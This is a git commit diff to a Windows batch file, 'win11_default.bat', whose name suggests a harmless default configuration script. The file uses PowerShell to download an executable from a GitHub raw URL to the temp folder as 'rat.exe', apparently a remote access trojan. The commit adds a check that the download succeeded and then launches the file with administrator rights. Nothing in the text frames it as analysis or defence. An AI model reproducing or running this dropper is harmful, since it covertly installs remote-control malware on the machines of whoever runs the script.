5538e66722451e8e9dc7f47d2fcdb81d32e798b0
optolab <sloneeddie36@gmail.com>
2025-01-12 14:04:43 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,7 +1,11 @@
 @echo off
 
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\rat.exe"
-echo "hi"
-start /B "" runas /user:Administrator "%TEMP%\rat.exe"
+if exist "%TEMP%\rat.exe" (
+    echo File downloaded successfully.
+    start /B "" runas /user:Administrator "%TEMP%\rat.exe"
+) else (
+    echo Failed to download file.
+)
 
 endlocal
